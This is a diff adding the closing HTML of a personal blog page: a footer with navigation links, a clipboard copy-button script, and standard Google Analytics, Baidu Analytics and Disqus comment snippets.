+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
